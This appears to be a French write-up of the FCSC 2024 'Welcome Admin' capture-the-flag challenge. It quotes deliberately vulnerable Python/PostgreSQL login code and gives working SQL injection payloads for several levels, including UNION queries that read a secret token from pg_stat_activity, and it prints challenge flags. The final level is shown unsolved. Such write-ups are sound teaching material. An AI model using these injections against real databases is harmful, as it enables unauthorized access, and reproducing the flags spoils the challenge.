## Description

Au coeur d’un réseau labyrinthique, là où la lumière des écrans peine à éclairer les recoins les plus sombres, une demande spéciale est lancée dans les abîmes, un appel discret, attendu seulement par ceux qui connaissent les profondeurs. Seul un véritable expert pourra répondre à l’appel, cryptiquement formulé : “Un expert en SQL est demandé à la caisse numéro 3.”

Cette épreuve a été découpée en deux parties :

- [Welcome Admin 1/2](https://hackropole.fr/fr/challenges/web/fcsc2024-web-welcome-admin-1/).
- [Welcome Admin 2/2](https://hackropole.fr/fr/challenges/web/fcsc2024-web-welcome-admin-2/).

## Write-Up

### Level 1
C'était une injection SQL Classique pour la partie 1 :
![[Pasted image 20250221103134.png]]

FCSC{94738150696e2903c924f0079bd95cd8256c648314654f32d6aaa090846a8af5}

On regardant le code python, on vient de passer le niveau 1 mais pour avoir le deuxième flag, il va falloir qu'on passe 4 autres niveaux ! Chacun avec son injection SQL propre à lui, et ces spécificités.

### Level 2
On voit que cette fois c'est une fonction dans plpgsql qui est utilisé :
```python
CREATE FUNCTION check_password(_password text) RETURNS text
    AS $$
        BEGIN
            IF _password = '{token}' THEN
                RETURN _password;
            END IF;
            RETURN 'nope';
        END;
    $$
    IMMUTABLE LANGUAGE plpgsql;
```

Bingo :
![[Pasted image 20250221104947.png]]

### Level 3

```python
@app.route("/super-admin", methods=["GET", "POST"])
@login_for(Rank.SUPER_ADMIN, Rank.HYPER_ADMIN, "/hyper-admin")

def level3(cursor: cursor, password: str):
    token = os.urandom(16).hex()
    cursor.execute(f"SELECT '{token}', '{password}';")
    row = cursor.fetchone()
    if not row:
        return False
    if len(row) != 2:
        return False
    return row[1] == token
```

Bon de ce qu'on voit ici, le token est inclus directement dans la requête SQL, bon il faut faire un peu de recherche mais on pourrait aller chopper la valeur direct dans les requêts SQL en cours d'exécution : 
https://stackoverflow.com/questions/12641676/how-to-get-a-status-of-a-running-query-in-postgresql-database

Bingo, la table s'appelle pg_stat_activity, bon si on reprend notre SQL ça devrait donner un truc dans le genre :
```sql
select query FROM pg_stat_activity where query like 'SELECT ''%' order by 1 limit 1
```

Plus qu'à couper la requête pour extraire ce qu'on souhaite : 
```sql
SUBSTR((select query FROM pg_stat_activity where query like 'SELECT ''%' order by 1 ASC  limit 1), 9, 32)
```

Sauf que ça ne marchera pas comme ça, on refait la même requête :
```sql
union select SUBSTR((select query FROM pg_stat_activity where query like 'SELECT ''%' order by 1 ASC  limit 1), 9, 32), SUBSTR((select query FROM pg_stat_activity where query like 'SELECT ''%' order by 1 ASC  limit 1), 9, 32) order by 2 DESC limit 1 --
```

Et voilà : 
![[Pasted image 20250221105901.png]]

### Level 4

Ici  c'est la cata, ça renvoie un md5 aléatoire et le mot de passe qu'on envoie:
```python
@app.route("/hyper-admin", methods=["GET", "POST"])
@login_for(Rank.HYPER_ADMIN, Rank.TURBO_ADMIN, "/turbo-admin")
def level4(cursor: cursor, password: str):
    cursor.execute(f"""SELECT md5(random()::text), '{password}';""")
    row = cursor.fetchone()
        if not row:
        return False
    if len(row) != 2:
        return False
    return row[0] == row[1]
```

Mais pas tant car on peut se baser sur la même requête union de tout à l'heure mais en faisant plus simple :
```sql
' union select '1', '1' order by 2 DESC limit 1 --
```

Bingo :
![[Pasted image 20250221110203.png]]

### Level 5

Le level finale !! :
```python
def level5(cursor: cursor, password: str):
    table_name = "table_" + os.urandom(16).hex()
    col_name = "col_" + os.urandom(16).hex()
    token = os.urandom(16).hex()
    cursor.execute(
        f"""
        CREATE TABLE "{table_name}" (
          id serial PRIMARY KEY,
          "{col_name}" text
        );  
        INSERT INTO "{table_name}"("{col_name}") VALUES ('{token}');
        """
    )
    cursor.execute(f"SELECT '{password}';")
    row = cursor.fetchone()
    print(row)
    if not row:
        return False
    if len(row) != 1:
        return False
    return row[0] == token
```

